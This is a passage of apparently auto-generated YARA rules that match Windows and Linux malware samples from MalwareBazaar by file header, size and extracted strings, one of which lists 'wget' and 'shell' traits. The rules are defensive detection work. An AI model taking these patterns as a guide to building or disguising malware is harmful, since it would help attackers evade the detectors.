    strings:
        $s1 = "jRSnaL.exe"
        $s2 = "KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"
        $s3 = "mscoree.dll"
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">"
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 807KB
        and all of them
}

rule Linux_b6127e01ed91f6d02551decb4e0fe18b8a2dcd0ba5c17919c91e1ecbbac70373
{
    meta:
        description = "Auto ML: b6127e01ed91f6d02551decb4e0fe18b8a2dcd0ba5c17919c91e1ecbbac70373"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wgetX"
        $s2 = "/usr/*"
        $s3 = "shell"
        $s4 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s5 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Windows_b61504da1a042a26350f9b97750f0361a904eb16b69ecde0fbb22ac7eab788c5
{
    meta:
        description = "Auto ML: b61504da1a042a26350f9b97750f0361a904eb16b69ecde0fbb22ac7eab788c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "user32"
        $s3 = "user32.dll"
        $s4 = "kernel32"
        $s5 = "wininet.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_b61c3baadd541bcafad124668888e322d70720335a6f46173b489a47d5b66c1c
{
    meta:
        description = "Auto ML: b61c3baadd541bcafad124668888e322d70720335a6f46173b489a47d5b66c1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "LevelUp.exe"
        $s2 = "kernel32.dll"
        $s3 = "System.IO"
        $s4 = "kernel32"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 435KB
        and all of them
}

rule Windows_b62170f159d7dd4f853913e3c6a3a41fb6699e597d88cea9f08ffa93266084ff
{
    meta:
        description = "Auto ML: b62170f159d7dd4f853913e3c6a3a41fb6699e597d88cea9f08ffa93266084ff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Http"
        $s2 = "Gedgqvm.exe"
        $s3 = "System.IO"
        $s4 = "Microsoft Office"
        $s5 = "Microsoft Corporation"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 457KB
        and all of them
}
